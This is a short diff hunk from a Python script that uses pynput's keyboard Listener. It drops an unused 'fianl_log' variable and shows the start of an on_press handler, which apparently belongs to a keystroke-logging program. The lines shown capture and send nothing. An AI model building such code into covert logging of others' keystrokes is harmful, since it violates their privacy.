@@ -3,7 +3,7 @@ from pynput.keyboard import Key, Listener
 from datetime import datetime
 import json
 
-count, keys, fianl_log = 0, [], {}
+count, keys = 0, []
 
 def on_press(key):
 	global keys, count
